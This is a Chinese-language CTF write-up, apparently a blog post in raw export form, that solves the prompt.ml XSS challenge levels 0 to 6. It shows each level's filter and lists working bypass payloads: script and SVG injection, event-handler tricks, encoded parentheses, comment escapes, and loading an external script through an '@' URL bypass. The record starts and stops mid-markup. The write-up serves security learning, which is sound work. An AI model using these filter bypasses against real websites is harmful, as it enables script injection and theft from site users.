title=\"Img:\"></a>Img:</h2><ol>\n<li><code>&quot;&gt;&lt;svg&gt;&lt;!--#--&gt;&lt;script&gt;&lt;!--#--&gt;prompt(1&lt;!--#--&gt;)&lt;/</code></li>\n</ol>\n<p><img src=\"/img/xss/prompt_ml/levelF_001.png\" alt=\"F_1\"></p>\n<ol start=\"2\">\n<li><code>&quot;&gt;&lt;script&gt;`#${prompt(1)}#`&lt;/script&gt;</code></li>\n</ol>\n<p><img src=\"/img/xss/prompt_ml/levelF_002.png\" alt=\"F_2\"></p>\n","site":{"data":{}},"excerpt":"","more":"<h1 id=\"prompt-xss笔记\"><a href=\"#prompt-xss笔记\" class=\"headerlink\" title=\"prompt-xss笔记\"></a>prompt-xss笔记</h1><p>在线xss题目,用于xss学习,弹出prompt(1)就过关.</p>\n<p>地址:<a href=\"http://prompt.ml\" target=\"_blank\" rel=\"noopener\">http://prompt.ml</a></p>\n<p>文档: <a href=\"https://github.com/cure53/XSSChallengeWiki/wiki/prompt.ml\" target=\"_blank\" rel=\"noopener\">https://github.com/cure53/XSSChallengeWiki/wiki/prompt.ml</a></p>\n<p>我使用的是firefox浏览器,不同的浏览器有时会有些差异。</p>\n<h1 id=\"Level-0\"><a href=\"#Level-0\" class=\"headerlink\" title=\"Level 0\"></a>Level 0</h1><h2 id=\"Code\"><a href=\"#Code\" class=\"headerlink\" title=\"Code:\"></a>Code:</h2><figure class=\"highlight scilab\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">escape</span><span class=\"params\">(input)</span> &#123;</span></span><br><span class=\"line\">    <span class=\"comment\">// warm up</span></span><br><span class=\"line\">    <span class=\"comment\">// script should be executed without user interaction</span></span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"string\">'&lt;input type=\"</span>text<span class=\"string\">\" value=\"</span><span class=\"string\">' + input + '</span><span class=\"string\">\"&gt;'</span>;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"分析\"><a href=\"#分析\" class=\"headerlink\" title=\"分析:\"></a>分析:</h2><p>没有过滤,需要构造闭合。<br>官方文档的答案是<code>&quot;&gt;&lt;svg  onload=prompt(1)&gt;</code>,利用了svg标签的onload事件，<br>而onload 事件会在页面或图像加载完成后立即发生。</p>\n<h2 id=\"Solutions\"><a href=\"#Solutions\" class=\"headerlink\" title=\"Solutions:\"></a>Solutions:</h2><figure class=\"highlight xml\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">1. \"&gt;<span class=\"tag\">&lt;<span class=\"name\">script</span>&gt;</span><span class=\"undefined\">prompt(1)</span><span class=\"tag\">&lt;/<span class=\"name\">script</span>&gt;</span></span><br><span class=\"line\"></span><br><span class=\"line\">2. \"&gt;<span class=\"tag\">&lt;<span class=\"name\">svg</span> <span class=\"attr\">onload</span>=<span class=\"string\">prompt(1)</span>&gt;</span></span><br><span class=\"line\"></span><br><span class=\"line\">3. 利用外联方式 </span><br><span class=\"line\">\"&gt;<span class=\"tag\">&lt;<span class=\"name\">script</span> <span class=\"attr\">src</span>=<span class=\"string\">\"http://10.60.250.250/pro.js\"</span>&gt;</span><span class=\"undefined\"></span><span class=\"tag\">&lt;/<span class=\"name\">script</span>&gt;</span></span><br><span class=\"line\"></span><br><span class=\"line\">4. 利用onerror事件,当src寻找的资源不存在发送错误弹框。</span><br><span class=\"line\">\"&gt;<span class=\"tag\">&lt;<span class=\"name\">img</span> <span class=\"attr\">src</span>=<span class=\"string\">''</span> <span class=\"attr\">onerror</span>=<span class=\"string\">'prompt(1)'</span>&gt;</span></span><br><span class=\"line\"></span><br><span class=\"line\">5. 利用html的字符实体和SVG。</span><br><span class=\"line\">    SVG意为可缩放矢量图形（Scalable Vector Graphics）。</span><br><span class=\"line\">    SVG 使用 XML 格式定义图像。</span><br><span class=\"line\">   \"&gt;<span class=\"tag\">&lt;<span class=\"name\">svg</span>&gt;</span><span class=\"tag\">&lt;<span class=\"name\">script</span>&gt;</span><span class=\"undefined\">prompt&amp;#x28;1&amp;#x29;</span><span class=\"tag\">&lt;/<span class=\"name\">script</span>&gt;</span><span class=\"tag\">&lt;/<span class=\"name\">svg</span>&gt;</span></span><br><span class=\"line\"></span><br><span class=\"line\">6. 利用编码</span><br><span class=\"line\">\t\"&gt;<span class=\"tag\">&lt;<span class=\"name\">img</span> <span class=\"attr\">src</span>=<span class=\"string\">\"x\"</span> <span class=\"attr\">onerror</span>=<span class=\"string\">\"&amp;#x70;&amp;#x72;&amp;#x6f;&amp;#x6d;&amp;#x70;&amp;#x74;&amp;#x28;&amp;#x31;&amp;#x29;\"</span></span></span><br><span class=\"line\"><span class=\"tag\">&gt;</span></span><br></pre></td></tr></table></figure>\n\n<h2 id=\"Img\"><a href=\"#Img\" class=\"headerlink\" title=\"Img:\"></a>Img:</h2><ol>\n<li><code>&quot;&gt;&lt;script&gt;prompt(1)&lt;/script&gt;</code></li>\n</ol>\n<p><img src=\"/img/xss/prompt_ml/level0_001.png\" alt=\"0_1\"></p>\n<ol start=\"2\">\n<li><code>&quot;&gt;&lt;svg onload=prompt(1)&gt;</code></li>\n</ol>\n<p><img src=\"/img/xss/prompt_ml/level0_002.png\" alt=\"0_2\"></p>\n<ol start=\"3\">\n<li><code>&quot;&gt;&lt;script src=&quot;http://10.60.250.250/pro.js&quot;&gt;&lt;/script&gt;</code></li>\n</ol>\n<p><img src=\"/img/xss/prompt_ml/level0_003.png\" alt=\"0_3\"></p>\n<ol start=\"4\">\n<li><code>&quot;&gt;&lt;img src=&#39;&#39; onerror=&#39;prompt(1)&#39;&gt;</code></li>\n</ol>\n<p><img src=\"/img/xss/prompt_ml/level0_004.png\" alt=\"0_4\"></p>\n<ol start=\"5\">\n<li><code>&quot;&gt;&lt;svg&gt;&lt;script&gt;prompt&amp;#x28;1&amp;#x29;&lt;/script&gt;&lt;/svg&gt;</code></li>\n</ol>\n<p><img src=\"/img/xss/prompt_ml/level0_005.png\" alt=\"0_5\"></p>\n<ol start=\"6\">\n<li><code>&quot;&quot;&gt;&lt;img src=&quot;x&quot; onerror=&quot;&amp;#x70;&amp;#x72;&amp;#x6f;&amp;#x6d;&amp;#x70;&amp;#x74;&amp;#x28;&amp;#x31;&amp;#x29;&quot;&gt;</code></li>\n</ol>\n<p><img src=\"/img/xss/prompt_ml/level0_006.png\" alt=\"0_6\"></p>\n<h1 id=\"Level-1\"><a href=\"#Level-1\" class=\"headerlink\" title=\"Level 1\"></a>Level 1</h1><h2 id=\"Code-1\"><a href=\"#Code-1\" class=\"headerlink\" title=\"Code:\"></a>Code:</h2><figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">escape</span>(<span class=\"params\">input</span>) </span>&#123;</span><br><span class=\"line\">    <span class=\"comment\">// tags stripping mechanism from ExtJS library</span></span><br><span class=\"line\">    <span class=\"comment\">// Ext.util.Format.stripTags</span></span><br><span class=\"line\">    <span class=\"keyword\">var</span> stripTagsRE = <span class=\"regexp\">/&lt;\\/?[^&gt;]+&gt;/gi</span>;</span><br><span class=\"line\">    input = input.replace(stripTagsRE, <span class=\"string\">''</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"string\">'&lt;article&gt;'</span> + input + <span class=\"string\">'&lt;/article&gt;'</span>;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"分析-1\"><a href=\"#分析-1\" class=\"headerlink\" title=\"分析:\"></a>分析:</h2><p>过滤了<code>&lt;&gt;</code>,只要用<code>&lt;&gt;</code>闭合就将<code>&lt;xx&gt;</code>全部替换为空。</p>\n<p>可以去掉<code>&gt;</code>来绕过，浏览器在处理没有右尖括号的标签时有兼容性，没有<code>&gt;</code>的标签也能生效。（注意这时候后边不能有内容)。</p>\n<p>可以用//注释或换行分开<code>&lt;/article&gt;</code></p>\n<p>官方答案是<code>&lt;svg/onload=prompt(1)</code>,其实和<code>&lt;svg onload=prompt(1)</code>相同。</p>\n<h2 id=\"Solutions-1\"><a href=\"#Solutions-1\" class=\"headerlink\" title=\"Solutions:\"></a>Solutions:</h2><figure class=\"highlight lsl\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"number\">1.</span> </span><br><span class=\"line\">&lt;img src=# onerror=prompt(<span class=\"number\">1</span>)</span><br><span class=\"line\"><span class=\"number\">123</span> <span class=\"comment\">//(这里的123是为了使img生效)</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"number\">2.</span> &lt;svg/onload=prompt(<span class=\"number\">1</span>)<span class=\"comment\">// (利用注释过掉&lt;/article&gt;)</span></span><br><span class=\"line\">\t或</span><br><span class=\"line\">\t&lt;svg onload=prompt(<span class=\"number\">1</span>)<span class=\"comment\">//</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"number\">3.</span> 利用onerror事件,当src寻找的资源不存在发送错误弹框。</span><br><span class=\"line\">\t&lt;img src='' onerror='prompt(<span class=\"number\">1</span>)'</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"Img-1\"><a href=\"#Img-1\" class=\"headerlink\" title=\"Img:\"></a>Img:</h2><ol>\n<li><figure class=\"highlight routeros\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;img <span class=\"attribute\">src</span>=# <span class=\"attribute\">onerror</span>=prompt(1)</span><br><span class=\"line\">123</span><br></pre></td></tr></table></figure>\n\n</li>\n</ol>\n<p><img src=\"/img/xss/prompt_ml/level1_001.png\" alt=\"1_1\"></p>\n<ol start=\"2\">\n<li><p><code>&lt;svg/onload=prompt(1)//</code><br><img src=\"/img/xss/prompt_ml/level1_002.png\" alt=\"1_2\"></p>\n</li>\n<li><p><code>&lt;img src=&#39;&#39; onerror=&#39;prompt(1)&#39;</code>或<code>&lt;img src=&#39;&#39; onerror=&#39;prompt(1)&#39; /</code>或<code>&lt;img src=&#39;&#39; onerror=&#39;prompt(1)&#39; //</code></p>\n</li>\n</ol>\n<p><img src=\"/img/xss/prompt_ml/level1_003.png\" alt=\"1_3\"></p>\n<h1 id=\"Level-2\"><a href=\"#Level-2\" class=\"headerlink\" title=\"Level 2\"></a>Level 2</h1><h2 id=\"Code-2\"><a href=\"#Code-2\" class=\"headerlink\" title=\"Code:\"></a>Code:</h2><figure class=\"highlight lua\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">escape</span><span class=\"params\">(input)</span></span> &#123;</span><br><span class=\"line\">    //                      v<span class=\"comment\">-- frowny face</span></span><br><span class=\"line\">    <span class=\"built_in\">input</span> = <span class=\"built_in\">input</span>.replace(/[=(]/g, <span class=\"string\">''</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">    // ok seriously, disallows equal signs <span class=\"keyword\">and</span> <span class=\"built_in\">open</span> parenthesis</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"built_in\">input</span>;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"分析-2\"><a href=\"#分析-2\" class=\"headerlink\" title=\"分析:\"></a>分析:</h2><figure class=\"highlight autohotkey\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">过滤了`=`和`)`</span><br><span class=\"line\">尝试使用编码或其他方式绕过</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"Solutions-2\"><a href=\"#Solutions-2\" class=\"headerlink\" title=\"Solutions:\"></a>Solutions:</h2><figure class=\"highlight xml\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">1.使用html编码,&amp;#x28;或&amp;lpar;替代(</span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">svg</span>&gt;</span><span class=\"tag\">&lt;<span class=\"name\">script</span>&gt;</span><span class=\"undefined\">prompt&amp;#x28;1)</span><span class=\"tag\">&lt;/<span class=\"name\">script</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">svg</span>&gt;</span><span class=\"tag\">&lt;<span class=\"name\">script</span>&gt;</span><span class=\"undefined\">prompt&amp;lpar;1)</span><span class=\"tag\">&lt;/<span class=\"name\">script</span>&gt;</span></span><br><span class=\"line\">官方答案是`<span class=\"tag\">&lt;<span class=\"name\">svg</span>&gt;</span><span class=\"tag\">&lt;<span class=\"name\">script</span>&gt;</span><span class=\"handlebars\"><span class=\"xml\">prompt&amp;#40;1)<span class=\"tag\">&lt;<span class=\"name\">b</span>&gt;</span>`,缩短了字符。用的是&amp;#40是10进制的。</span></span></span><br><span class=\"line\"><span class=\"undefined\"></span></span><br><span class=\"line\"><span class=\"undefined\">2. 官方答案:</span></span><br><span class=\"line\"><span class=\"handlebars\"><span class=\"xml\">\t<span class=\"tag\">&lt;<span class=\"name\">script</span>&gt;</span><span class=\"javascript\"><span class=\"built_in\">eval</span>.call<span class=\"string\">`<span class=\"subst\">$&#123;<span class=\"string\">'prompt\\x281)'</span>&#125;</span>`</span></span></span></span><span class=\"tag\">&lt;/<span class=\"name\">script</span>&gt;</span></span><br><span class=\"line\"></span><br><span class=\"line\">3. 官方答案:</span><br><span class=\"line\">\t<span class=\"tag\">&lt;<span class=\"name\">script</span>&gt;</span><span class=\"javascript\">prompt.call<span class=\"string\">`<span class=\"subst\">$&#123;<span class=\"number\">1</span>&#125;</span>`</span></span><span class=\"tag\">&lt;/<span class=\"name\">script</span>&gt;</span></span><br></pre></td></tr></table></figure>\n\n<h2 id=\"Img-2\"><a href=\"#Img-2\" class=\"headerlink\" title=\"Img:\"></a>Img:</h2><ol>\n<li><p><code>&lt;svg&gt;&lt;script&gt;prompt&amp;#x28;1)&lt;/script&gt;</code></p>\n</li>\n</ol>\n<p><img src=\"/img/xss/prompt_ml/level2_001.png\" alt=\"2_1\"></p>\n<ol start=\"2\">\n<li><p><code>&lt;script&gt;eval.call`${&#39;prompt\\x281)&#39;}`&lt;/script&gt;</code></p>\n<p><img src=\"/img/xss/prompt_ml/level2_002.png\" alt=\"2_2\"></p>\n</li>\n<li><p><code>&lt;script&gt;prompt.call`${1}`&lt;/script&gt;</code><br>  <img src=\"/img/xss/prompt_ml/level2_003.png\" alt=\"2_3\"></p>\n</li>\n</ol>\n<h1 id=\"Level-3\"><a href=\"#Level-3\" class=\"headerlink\" title=\"Level 3\"></a>Level 3</h1><h2 id=\"Code-3\"><a href=\"#Code-3\" class=\"headerlink\" title=\"Code:\"></a>Code:</h2><figure class=\"highlight lua\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">escape</span><span class=\"params\">(input)</span></span> &#123;</span><br><span class=\"line\">    // filter potential comment <span class=\"keyword\">end</span> delimiters</span><br><span class=\"line\">    <span class=\"built_in\">input</span> = <span class=\"built_in\">input</span>.replace(/-&gt;/g, <span class=\"string\">'_'</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">    // comment the <span class=\"built_in\">input</span> to avoid script execution</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"string\">'&lt;!-- '</span> + <span class=\"built_in\">input</span> + <span class=\"string\">' --&gt;'</span>;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"分析-3\"><a href=\"#分析-3\" class=\"headerlink\" title=\"分析:\"></a>分析:</h2><figure class=\"highlight coq\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">过滤了-&gt;并替换成<span class=\"keyword\">_</span></span><br><span class=\"line\">但是除了--&gt;可以闭合注释，--!&gt;也可以。</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"Solutions-3\"><a href=\"#Solutions-3\" class=\"headerlink\" title=\"Solutions:\"></a>Solutions:</h2><figure class=\"highlight xml\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">1.--!&gt;<span class=\"tag\">&lt;<span class=\"name\">svg</span>/ <span class=\"attr\">onload</span>=<span class=\"string\">prompt(1)</span>&gt;</span></span><br><span class=\"line\"></span><br><span class=\"line\">2. 官方答案:</span><br><span class=\"line\">\t<span class=\"tag\">&lt;<span class=\"name\">script</span>&gt;</span><span class=\"javascript\"><span class=\"built_in\">eval</span>.call<span class=\"string\">`<span class=\"subst\">$&#123;<span class=\"string\">'prompt\\x281)'</span>&#125;</span>`</span></span><span class=\"tag\">&lt;/<span class=\"name\">script</span>&gt;</span></span><br><span class=\"line\"></span><br><span class=\"line\">3. 官方答案:</span><br><span class=\"line\">\t<span class=\"tag\">&lt;<span class=\"name\">script</span>&gt;</span><span class=\"javascript\">prompt.call<span class=\"string\">`<span class=\"subst\">$&#123;<span class=\"number\">1</span>&#125;</span>`</span></span><span class=\"tag\">&lt;/<span class=\"name\">script</span>&gt;</span></span><br></pre></td></tr></table></figure>\n\n<h2 id=\"Img-3\"><a href=\"#Img-3\" class=\"headerlink\" title=\"Img:\"></a>Img:</h2><ol>\n<li><code>--!&gt;&lt;svg/ onload=prompt(1)&gt;</code></li>\n</ol>\n<p><img src=\"/img/xss/prompt_ml/level3_001.png\" alt=\"3_1\"></p>\n<h1 id=\"Level-4\"><a href=\"#Level-4\" class=\"headerlink\" title=\"Level 4\"></a>Level 4</h1><h2 id=\"Code-4\"><a href=\"#Code-4\" class=\"headerlink\" title=\"Code:\"></a>Code:</h2><figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">escape</span>(<span class=\"params\">input</span>) </span>&#123;</span><br><span class=\"line\">    <span class=\"comment\">// make sure the script belongs to own site</span></span><br><span class=\"line\">    <span class=\"comment\">// sample script: http://prompt.ml/js/test.js</span></span><br><span class=\"line\">    <span class=\"keyword\">if</span> (<span class=\"regexp\">/^(?:https?:)?\\/\\/prompt\\.ml\\//i</span>.test(<span class=\"built_in\">decodeURIComponent</span>(input))) &#123;</span><br><span class=\"line\">        <span class=\"keyword\">var</span> script = <span class=\"built_in\">document</span>.createElement(<span class=\"string\">'script'</span>);</span><br><span class=\"line\">        script.src = input;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> script.outerHTML;</span><br><span class=\"line\">    &#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"string\">'Invalid resource.'</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"分析-4\"><a href=\"#分析-4\" class=\"headerlink\" title=\"分析:\"></a>分析:</h2><figure class=\"highlight gcode\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">只能匹配http:<span class=\"comment\">//prompt.ml/或//prompt.ml/下网址,可以利用@绕过访问从而其他域名。</span></span><br><span class=\"line\">这里需要把它的/用url编码<span class=\"meta\">%</span><span class=\"number\">2</span>f,@后的ip填写我php环境搭建的地址,其中的pro.js文件内</span><br><span class=\"line\">填写prompt<span class=\"comment\">(1)</span>即可。</span><br><span class=\"line\">最终payload为：http:<span class=\"comment\">//prompt.ml%2f@10.60.250.250/pro.js</span></span><br></pre></td></tr></table></figure>\n\n<h2 id=\"Solutions-4\"><a href=\"#Solutions-4\" class=\"headerlink\" title=\"Solutions:\"></a>Solutions:</h2><figure class=\"highlight stylus\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"number\">1</span><span class=\"selector-class\">.http</span>:<span class=\"comment\">//prompt.ml%2f@10.60.250.250/pro.js</span></span><br></pre></td></tr></table></figure>\n\n<h2 id=\"Img-4\"><a href=\"#Img-4\" class=\"headerlink\" title=\"Img:\"></a>Img:</h2><ol>\n<li><code>http://prompt.ml%2f@10.60.250.250/pro.js</code></li>\n</ol>\n<p><img src=\"/img/xss/prompt_ml/level4_001.png\" alt=\"4_1\"></p>\n<h1 id=\"Level-5\"><a href=\"#Level-5\" class=\"headerlink\" title=\"Level 5\"></a>Level 5</h1><h2 id=\"Code-5\"><a href=\"#Code-5\" class=\"headerlink\" title=\"Code:\"></a>Code:</h2><figure class=\"highlight xquery\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">function</span> escape(input) &#123;</span><br><span class=\"line\">    //<span class=\"built_in\"> apply</span> <span class=\"keyword\">strict</span><span class=\"built_in\"> filter</span> rules <span class=\"keyword\">of</span> level <span class=\"number\">0</span></span><br><span class=\"line\">    //<span class=\"built_in\"> filter</span> <span class=\"string\">\"&gt;\"</span> <span class=\"keyword\">and</span> event handlers</span><br><span class=\"line\">    input = input<span class=\"built_in\">.replace</span>(/&gt;|on.+?=|focus/gi, <span class=\"string\">'_'</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"string\">'&lt;input value=\"'</span> + input + <span class=\"string\">'\" type=\"text\"&gt;'</span>;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"分析-5\"><a href=\"#分析-5\" class=\"headerlink\" title=\"分析:\"></a>分析:</h2><figure class=\"highlight routeros\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">将&gt; onXXX= focus替代为了_ (其中XXX代表任意字符)</span><br><span class=\"line\">过滤&gt;的目的是为了防止&gt;构造闭合。</span><br><span class=\"line\">过滤<span class=\"attribute\">onXXX</span>=是为了过滤on开头的事件。</span><br><span class=\"line\">过滤focus是为了过滤focus事件</span><br><span class=\"line\">对于&lt;input <span class=\"attribute\">value</span>=<span class=\"string\">\"\"</span> <span class=\"attribute\">type</span>=<span class=\"string\">\"text\"</span>&gt;中type和value的顺序,能够利用img</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"Solutions-5\"><a href=\"#Solutions-5\" class=\"headerlink\" title=\"Solutions:\"></a>Solutions:</h2><figure class=\"highlight lsl\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"number\">1.</span>用换行绕过onXXX=</span><br><span class=\"line\"><span class=\"string\">\" type='image' src=''  onerror</span></span><br><span class=\"line\"><span class=\"string\">=\"</span>prompt(<span class=\"number\">1</span>)</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"Img-5\"><a href=\"#Img-5\" class=\"headerlink\" title=\"Img:\"></a>Img:</h2><p>1.</p>\n<figure class=\"highlight 1c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"string\">\" type='image' src=''  onerror</span></span><br><span class=\"line\">=<span class=\"string\">\"prompt(1)</span></span><br></pre></td></tr></table></figure>\n\n<p><img src=\"/img/xss/prompt_ml/level5_001.png\" alt=\"5_1\"></p>\n<h1 id=\"Level-6\"><a href=\"#Level-6\" class=\"headerlink\" title=\"Level 6\"></a>Level 6</h1><h2 id=\"Code-6\"><a href=\"#Code-6\" class=\"headerlink\" title=\"Code:\"></a>Code:</h2><figure class=\"highlight stata\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">function escape(<span class=\"keyword\">input</span>) &#123;</span><br><span class=\"line\">    <span class=\"comment\">// let's do a post redirection</span></span><br><span class=\"line\">    try &#123;</span><br><span class=\"line\">        <span class=\"comment\">// pass in formURL#formDataJSON</span></span><br><span class=\"line\">        <span class=\"comment\">// e.g. http://httpbin.org/post#&#123;\"name\":\"Matt\"&#125;</span></span><br><span class=\"line\">        <span class=\"keyword\">var</span> segments = <span class=\"keyword\">input</span>.<span class=\"keyword\">split</span>('#');</span><br><span class=\"line\">        <span class=\"keyword\">var</span> formURL = segments[0];</span><br><span class=\"line\">        <span class=\"keyword\">var</span> formData = JSON.<span class=\"keyword\">parse</span>(segments[1]);</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"keyword\">var</span> <span class=\"keyword\">form</span> = document.createElement('<span class=\"keyword\">form</span>');</span><br><span class=\"line\">        <span class=\"keyword\">form</span>.action = formURL;</span><br><span class=\"line\">        <span class=\"keyword\">form</span>.method = '<span class=\"keyword\">post</span>';</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"keyword\">for</span> (<span class=\"keyword\">var</span> i <span class=\"keyword\">in</span> formData) &#123;</span><br><span class=\"line\">            <span class=\"keyword\">var</span> <span class=\"keyword\">input</span> = <span class=\"keyword\">form</span>.appendChild(document.createElement('<span class=\"keyword\">input</span>'));</span><br><span class=\"line\">            <span class=\"keyword\">input</span>.name = i;</span><br><span class=\"line\">            <span class=\"keyword\">input</span>.setAttribute('value', formData[i]);</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"keyword\">form</span>.outerHTML + '                         \\<span class=\"keyword\">n</span>\\</span><br><span class=\"line\">    &lt;script&gt;                                                  \\<span class=\"keyword\">n</span>\\</span><br><span class=\"line\">        <span class=\"comment\">// forbid javascript: or vbscript: and data: stuff    \\n\\</span></span><br><span class=\"line\">        <span class=\"keyword\">if</span> (!/script:|data:/i.<span class=\"keyword\">test</span>(document.forms[0].action)) \\<span class=\"keyword\">n</span>\\</span><br><span class=\"line\">            document.forms[0].submit();                       \\<span class=\"keyword\">n</span>\\</span><br><span class=\"line\">        <span class=\"keyword\">else</span>                                                  \\<span 